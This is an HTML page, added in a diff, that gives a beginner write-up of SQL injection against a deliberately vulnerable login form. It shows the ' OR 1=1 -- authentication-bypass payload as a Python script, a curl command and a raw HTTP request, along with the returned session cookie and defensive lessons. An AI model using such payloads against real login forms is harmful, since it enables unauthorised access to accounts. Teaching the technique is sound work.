@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>SQL Injection 101 — A Beginner Writeup</title>
+</head>
+<body>
+<header><nav>Home | About</nav></header>
+<main>
+  <article>
+    <h1>SQL Injection 101 — A Beginner Writeup</h1>
+    <p>In this writeup we walk through a classic in-band SQL injection against a deliberately vulnerable login form.</p>
+    <h2>Reconnaissance</h2>
+    <p>First we inspect the login page. It accepts a username and password and returns a generic error on failure.</p>
+    <pre><code class="language-python">import requests
+
+url = "https://vuln.example.com/login"
+resp = requests.post(url, data={"user": "admin", "pass": "' OR 1=1 --"})
+print(resp.status_code)</code></pre>
+    <h2>Exploitation</h2>
+    <p>We craft a payload that always evaluates to true:</p>
+    <pre><code class="language-bash">$ curl -X POST https://vuln.example.com/login \
+  --data "user=admin&pass=' OR 1=1 --"</code></pre>
+    <p>The server responds with a session cookie:</p>
+    <pre><code>Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...; HttpOnly</code></pre>
+    <h2>Lessons learned</h2>
+    <ul>
+      <li>Use parameterized queries.</li>
+      <li>Never trust client input.</li>
+      <li>Log authentication failures.</li>
+    </ul>
+    <blockquote>SQL injection remains in the OWASP Top 10 because developers keep concatenating strings.</blockquote>
+    <p>A screenshot of the vulnerable form is shown below:</p>
+    <figure>
+      <img src="login_form.png" alt="Login form screenshot" title="Vulnerable login form">
+      <figcaption>Vulnerable login form.</figcaption>
+    </figure>
+    <h3>HTTP transcript</h3>
+    <pre><code class="language-http">POST /login HTTP/1.1
+Host: vuln.example.com
+Content-Type: application/x-www-form-urlencoded
+
+user=admin&pass=' OR 1=1 --</code></pre>
+    <hr>
+    <p>That's it. Stay safe out there.</p>
+  </article>
+</main>
+<footer>Copyright 2026</footer>
+</body>
+</html>
